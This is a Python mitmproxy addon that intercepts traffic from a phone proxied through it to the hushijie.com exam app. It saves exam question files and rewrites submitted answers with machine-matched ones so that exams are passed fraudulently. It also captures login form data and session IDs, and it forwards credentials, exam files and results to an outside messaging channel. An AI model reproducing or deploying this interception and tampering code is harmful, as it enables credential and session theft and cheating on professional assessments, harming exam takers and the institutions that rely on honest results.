#！/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
import urllib
import demjson
from m2m import e2e
import mitmproxy.http
from mitmproxy import ctx
from configparser import ConfigParser
from comm import path0,txtpath,confpath,str_to_pinyin,getip,boxmsg,read_start_response,parser,parser_login
from comm import base64decode as bde
from comm import base64encode as be
from models import AnswerRobot
import logger
class Hsj_Addon:
    def __init__(self):
        self.id=''
        self.flag=''
        self.response_path=''
        self.request_path=''
        self.answer_lst=None
        self.txt=None
        self.read_debug_config()
        self.logger=logger.logger()
        self.mitm_msg_formater=self.read_mitm_msg_formater()
        self.answer_robot=AnswerRobot(self.logger)
    def read_debug_config(self):
        conf=ConfigParser()
        conf.read(confpath+"default.ini", encoding="utf-8")
        self.DEBUG=conf.getint('Work-Mode','debug')
        self.user=conf.get('UserInf','user')
    def read_mitm_msg_formater(self):
        with open(path0+'conf/Msg_Formater.conf',mode='r',encoding='utf-8') as f:
            t=bde(f.read())
        return t
    def record_msg(self,flow:mitmproxy.http.HTTPFlow):
        h_lst=[]
        for h in flow.request.headers:
            h_lst.append('%s : %s'%(h,flow.request.headers[h]))
        t=self.mitm_msg_formater.format(m=flow.request.method,u=flow.request.url,
                   h='\n'.join(h_lst),d=flow.request.text,
                   r=flow.response.text)
        if self.DEBUG:
            self.logger.info('\n'+t)
        else:
            self.logger.info('\n'+be(t))
    def response(self, flow:mitmproxy.http.HTTPFlow):
        if (('hushijie.com' in flow.request.host) and
            ('appversion' in flow.request.path)):
            if self.flag=='exam_file_saved':
                self.flag='match_answer_processing'
                self.logger.debug(self.flag)
                fn=read_start_response(makefile=True)
                if not e2e('HSJ_log_%s'%self.user,'考题文件已保存',
                           fps=[self.logger.log_file_path,
                                txtpath+'start_response.txt',
                                txtpath+fn]):
                    self.logger.error('Failed to send exam_file')
                self.answer_lst=self.answer_robot.match_answer()
                self.answer_lst=self.answer_robot.adjust_rate(self.answer_lst,)
        if 'hushijie.com' in flow.request.host:
            self.record_msg(flow)
        if (('hushijie.com' in flow.request.host) and 
            ('start' in flow.request.path) and 
            ('answer' in flow.request.path) and 
            ('start_answer' not in flow.request.path)):
            self.response_path=txtpath+'start_response.txt'
            text=flow.response.get_text()
            j=json.loads(text)
            if j['ret']==0:
                print(j['tip'])
            elif j['ret']==1:
                print(boxmsg('已收到考试响应文件',CN_zh=True))
                with open(self.response_path,mode='w',encoding='utf-8') as f:
                    f.write(text)
                self.flag='exam_file_saved'
                print('{rpath}已保存'.format(rpath=self.response_path))
        if self.flag=='commit':
            self.response_path=txtpath+'commit_response.txt'
            if (self.id is not '') and (flow.id == self.id):
                text=flow.response.get_text()
                with open(self.response_path,mode='w',encoding='utf-8') as f:
                    f.write(text)
                print('{rpath}已保存'.format(rpath=self.response_path))
                if not e2e('HSJ_log_%s'%self.user,'答案数据已提交',
                    fps=[self.logger.log_file_path,txtpath+'commit_response.txt']):
                    self.logger.error('Failed to send commit_file')
        if (('hushijie.com' in flow.request.host) and (flow.request.method=='POST') and
            ('account/app/login' in flow.request.path)):
            self.txt=urllib.parse.unquote(flow.request.text)
            text=flow.response.get_text()
            j=json.loads(text)
            if j["ret"]==1:
                sessionid=j["sessionid"]
                info=parser_login(j['account'])
                st='\n'.join(self.txt.split(sep='&'))
                msg='{st}\n{info}\n{sid}'.format(st=st,info=info,sid=sessionid)
                if self.DEBUG:print(msg)
                if not e2e('护世界_登录信息_%s'%self.user,msg):
                    self.logger.error('Failed to send login')
                self.txt=None
        if (('hushijie.com' in flow.request.host) and 
            ('testunit/student/transcript/get' in flow.request.path)):
            text=flow.response.get_text()
            s=text.replace('\\"','')#替换到其中的\"
            j=demjson.decode(s)
            examname=j['testUnitAnswer']['examPaperFullInfo']['name']
            userdata=j['transcript']['userTranscript']
            totalscore=userdata['transcript']
            score=userdata['realTranscript']
            totalnum=userdata['questionNum']
            right=userdata['rightNum']
            wrong=userdata['wrongNum']
            rate=int(round(right/totalnum*100,0))
            report_format='考试名称：{examname}\n总分：{total}分，实际得分：{score}分\n总题数：{totalnum}题，答对{right}题，答错{wrong}题\n正确率：{rate}%'
            report_txt=report_format.format(examname=examname,rate=rate,
                                            total=totalscore,score=score,
                                            totalnum=totalnum,right=right,
                                            wrong=wrong)
            if not e2e('HSJ_考试结果_%s'%self.user,report_txt,
                    fps=[self.logger.log_file_path]):
                self.logger.error('Failed to send exam_result！')
    def request(self, flow: mitmproxy.http.HTTPFlow):
        if (('hushijie' in flow.request.host) and
            ('commit' in flow.request.path) and
            (flow.request.method=='POST')):
            print(boxmsg('考生正在提交答案',CN_zh=True))
            self.id=flow.id
            self.flag='commit'
            self.request_path=txtpath+'commit_request.txt'
            text=urllib.parse.unquote(flow.request.text)
            with open(self.request_path,mode='w',encoding='utf-8') as f:
                f.write(text)
            print('{rpath}已保存'.format(rpath=self.request_path))
            self.logger.debug('考生正在提交答案……')
            if self.answer_robot.method=='Auto':
                self.logger.debug('机器人正在修改答案……')
                if 'appVersion' in text :
                    print('提交加密数据')
                    jdata=self.answer_robot.modify_answer(
                                                flow,self.answer_lst,enc=True)
                else:
                    print('提交不加密数据')
                    jdata=self.answer_robot.modify_answer(
                                                flow,self.answer_lst,enc=False)
                    if 'CSP' in flow.request.headers:
                        flow.request.headers.pop('CSP')
                self.logger.debug('生成提交答案jdata\n%s'%jdata)
                modify_content=urllib.parse.urlencode(jdata).encode()
                flow.request.content=modify_content
                print(boxmsg('答案修改完毕，已提交答案',CN_zh=True))
ips=getip()
ctx.log.info('局域网IP：[{ip}]'.format(ip=' , '.join(ips)))
ctx.log.info('请在另一台手机上设置http代理')
txt='server:{ip}\nport:{port}'.format(ip=' | '.join(ips),port=8080)
ctx.log.info(boxmsg(txt,CN_zh=False))
addons = [Hsj_Addon()]